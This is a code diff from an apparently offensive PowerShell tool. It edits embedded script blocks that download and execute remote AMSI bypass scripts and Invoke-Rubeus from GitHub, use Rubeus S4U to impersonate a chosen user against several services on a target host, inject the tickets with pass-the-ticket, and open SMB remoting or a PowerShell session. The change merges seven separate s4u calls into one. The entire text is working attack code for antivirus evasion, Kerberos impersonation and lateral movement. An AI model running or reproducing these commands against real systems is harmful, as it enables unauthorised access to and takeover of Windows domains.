@@ -199,13 +199,7 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1') > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname,http/$FQDNHostname,host/$FQDNHostname,ldap/$FQDNHostname,wsman/$FQDNHostname,mssql/$FQDNHostname,rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Invoke-SMBRemoting -ComputerName $FQDNHostname
 "@
 		}
@@ -236,13 +230,7 @@ Enter-PSSession -ComputerName $FQDNHostname
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname,http/$FQDNHostname,host/$FQDNHostname,ldap/$FQDNHostname,wsman/$FQDNHostname,mssql/$FQDNHostname,rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Enter-PSSession -ComputerName $FQDNHostname
 "@
 		}
